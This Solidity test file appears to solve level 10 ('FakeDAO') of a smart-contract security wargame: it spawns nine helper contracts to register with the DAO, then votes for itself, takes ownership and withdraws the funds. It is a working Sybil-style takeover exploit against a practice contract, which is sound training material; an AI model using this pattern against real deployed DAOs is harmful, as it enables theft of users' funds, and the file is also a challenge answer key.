// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/10_FakeDAO/FakeDAO.sol";

contract AttackContract {
    FakeDAO attack;

    constructor(FakeDAO realInstance) {
        attack = realInstance;
    }

    function reg() external {
        attack.register();
    }
}

contract FakeDAOTest is BaseTest {
    FakeDAO instance;

    function setUp() public override {
        super.setUp();

        // Deploying the contract instance
        instance = new FakeDAO{value: 0.01 ether}(address(0xDeAdBeEf));
    }

    // function newInstance(FakeDAO fake) public {
    //     FakeDAO temp;
    //     temp = fake;
    //     fake.register();
    // }

    function testExploitLevel() public {
        for (int i = 0; i < 9; i++) {
            AttackContract attack = new AttackContract(instance);
            attack.reg();
            // newInstance(instance);
        }
        instance.register();
        instance.voteForYourself();
        instance.withdraw();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.owner() != owner, "Solution is not solving the level");
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
